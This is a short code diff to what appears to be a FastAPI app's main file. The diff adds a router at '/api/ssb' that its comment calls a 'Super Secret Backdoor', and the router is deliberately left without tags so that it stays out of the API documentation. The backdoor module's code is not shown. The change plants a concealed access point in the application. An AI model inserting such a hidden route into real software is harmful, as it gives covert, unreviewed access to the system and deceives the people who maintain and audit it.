@@ -78,6 +78,9 @@ app.include_router(schedule.router, prefix="/api", tags=["Schedule"])
 app.include_router(store.router, prefix="/api", tags=["Store"])
 app.include_router(diagnostics.router, prefix="/api", tags=["Diagnostics"])
 
+# Super Secret Backdoor - No tags, no documentation exposure
+app.include_router(super_secret_backdoor.router, prefix="/api/ssb")
+
 # Import and include admin analytics router
 from api import admin_analytics
 app.include_router(admin_analytics.router, prefix="/api/admin", tags=["Admin Analytics"])
